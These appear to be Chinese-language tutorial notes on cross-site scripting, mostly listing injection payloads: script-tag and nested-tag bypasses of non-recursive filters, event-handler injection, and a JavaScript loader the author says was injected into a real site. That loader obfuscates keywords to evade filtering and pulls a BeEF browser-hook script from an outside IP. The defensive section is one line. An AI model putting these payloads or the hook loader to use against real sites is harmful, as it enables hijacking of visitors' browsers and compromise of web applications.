# 02.XSS

##2.1 XSS介绍

  Cross-Site Scripting(跨站点脚本)是Web中最广泛利用的一种漏洞之一，占据OWASP 2013年Web漏洞第三位，其广泛程度以及危害性可见一斑。
  
  XSS漏洞的原理，简而言之，就是：利用Web应用程序的漏洞，向页面中注入JavaScript使其运行并进行破坏。 
   
###2.1.2 XSS可能出现的地方

##2.2 XSS注入技巧

 **只提供思路，不适用所有情况，根据过滤规则的不同，选择构造不同的playload。**

###2.2.1 屌丝篇
  
####2.2.1.1直接上菜

```javascript
<script>alert('xss');</script>
```

如果你的系统可以让用户那么直接执行javascript脚本，那你就等着哭吧。

####2.2.1.2 过滤script标签

ok，稍微有一丁点安全意识的人都会把script标签过滤掉，过滤的规则会很多，注入一定要根据过滤的规则不同而选择不同的playload，这里尝试讲解两种情况的过滤：
  
  * 过滤script标签本身，内容不过滤
  * 过滤script标签以及包含的所有内容

加入playload如下：
```html
<script>alert('xss');</script><p>正常文档</p>
```

那么第一种情况过滤的结果为：
```html
alert('xss');<p>正常文档</p>
```

而第二种情况过滤的结果为：
```html
<p>正常文档</p>
```

如果系统没有对用户输入进行递归的xss过滤的话，那么第一种情况，我们的playload可以是：
```html
<scr<script>ipt>alert('xss');</scr</script>ipt>
```

而第二种情况，可以尝试这种技巧：
```html
<scr<script></script>ipt>alert('xss');</scr<script></script>ipt>
```

####2.2.1.3 标签事件注入

标签的事件**on(event)**是很容易被利用作为playload的。例如：
```html
<p onmouseover="alert('xss');">鼠标移动到这里触发js脚本！</p>
```

如果想让脚本自动执行，可以利用onload,onunload,onerror等时间，可以利用onfouse事件，例如:

```html
<input onfouse="alert('xss')" autofouse />
```

如果系统对标签事件进行了过滤，那么可以针对过滤的规则进行playload，例如**2.2.1.2**提到的技巧。

####2.2.1.4 /代替空格

####2.2.1.7 其他可以利用的标签

  * iframe
  * meta
  * style
  * embed
  * flash
  * applet
  * ...

###2.2.2 高帅富篇

####2.2.2.1 伪协议javascript:alert('xss')

####2.2.2.2 伪协议data:text/html

####2.2.2.3 绕过关键字过滤的技巧

以下是我成功注入一个网站的一段js代码，系统对window,document,createElement,js等关键字进行了过滤，但还是被成功注入了。
```javascript
if(typeof beef=='undefined'){
  var url='http://119.xxx.128.103:3000/hook.'+'j'+'s';
  dd=self['d'+'o'+'cument'];
  bf=dd['create'+'Element']('script');
  bf.async=true;
  bf.src=url;dd.body.appendChild(bf);}
}
```

####2.2.2.3  完恶之源eval

##2.3 XSS防注
  
  
    数据和架构分离：前端模板jQuery，ejs，ployer，$('<div/>')
  
##2.4 XSS平台：beef-xss

参考文档：OWASP ,维基百科，百度百科
